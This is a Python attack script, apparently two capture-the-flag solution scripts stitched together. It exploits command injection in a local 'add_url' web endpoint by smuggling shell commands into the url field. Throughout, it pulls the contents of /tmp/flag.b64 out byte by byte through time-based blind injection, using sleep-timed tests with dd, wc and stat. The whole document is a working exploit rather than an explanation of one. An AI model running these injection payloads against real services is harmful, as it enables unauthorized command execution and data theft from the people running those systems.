import requests
import time
import base64

TARGET_URL = "http://127.0.0.1:32998/add_url"
CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def send_payload(payload_cmd, timeout=10):
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start = time.time()
    try:
        r = requests.post(TARGET_URL, data=data, timeout=timeout)
        return time.time() - start, r.status_code
    except:
        return 10, None

# Verify the file still exists and is valid
print("[*] Verifying /tmp/flag.b64 is still accessible")
cmd = "test -s /tmp/flag.b64 && sleep 2"
elapsed, _ = send_payload(cmd, timeout=5)
print(f"    File exists & non-empty: {elapsed:.2f}s (should be ~2s)")

# Try full charset for position 77
print("\n[*] Testing position 77 with FULL charset:")
for c in CHARSET:
    cmd = f'c=$(dd if=/tmp/flag.b64 bs=1 count=1 skip=76 2>/dev/null); [ "$c" = "{c}" ] && sleep 3'
    elapsed, _ = send_payload(cmd, timeout=6)
    if elapsed > 2.5:
        print(f"    [+] CHARACTER FOUND: '{c}' (time: {elapsed:.3f}s)")
        break
else:
    print("    [!] No character matched")

# Check position 98 too
print("\n[*] Testing position 98 with FULL charset:")
for c in CHARSET:
    cmd = f'c=$(dd if=/tmp/flag.b64 bs=1 count=1 skip=97 2>/dev/null); [ "$c" = "{c}" ] && sleep 3'
    elapsed, _ = send_payload(cmd, timeout=6)
    if elapsed > 2.5:
        print(f"    [+] CHARACTER FOUND: '{c}' (time: {elapsed:.3f}s)")
        break
else:
    print("    [!] No character matched")

import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"

def send_payload(payload_cmd, timeout=10):
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start = time.time()
    try:
        r = requests.post(TARGET_URL, data=data, timeout=timeout)
        return time.time() - start, r.status_code
    except:
        return 10, None

# Check exact file size
print("[*] Getting exact file size (character by character):")

found_size = -1
for size in range(95, 101):  # Around 98
    cmd = f'test $(cat /tmp/flag.b64 | wc -c) -eq {size} && sleep 2'
    elapsed, _ = send_payload(cmd, timeout=5)
    if elapsed > 1.5:
        found_size = size
        print(f"    File size: {size} characters (time: {elapsed:.3f}s)")

# Check for newline at various positions
print("\n[*] Checking for special characters (newline):")

# Position 98 may be a newline - let's check if file has newline
for i in range(97, 100):
    cmd = f'c=$(dd if=/tmp/flag.b64 bs=1 count=1 skip={i-1} 2>/dev/null); [ -z "$c" ] && sleep 2 || test "$c" = "" && sleep 3'
    elapsed, _ = send_payload(cmd, timeout=6)
    print(f"    Position {i} empty check: {elapsed:.3f}s")

# Try checking if wc with or without newline gives same count
print("\n[*] Checking newline presence in file:")
cmd = 'test $(cat /tmp/flag.b64 | wc -l) -eq 0 && sleep 2'
elapsed, _ = send_payload(cmd, timeout=5)
print(f"    0 lines: {elapsed:.3f}s")

cmd = 'test $(cat /tmp/flag.b64 | wc -l) -eq 1 && sleep 2'
elapsed, _ = send_payload(cmd, timeout=5)
print(f"    1 line: {elapsed:.3f}s")

# Use stat to check file size in bytes
print("\n[*] Checking file size with stat:")
for size in range(95, 101):
    cmd = f'stat -c%s /tmp/flag.b64 2>/dev/null | grep -q "^{size}$" && sleep 2'
    elapsed, _ = send_payload(cmd, timeout=5)
    if elapsed > 1.5:
        print(f"    File size (bytes): {size} (time: {elapsed:.3f}s)")

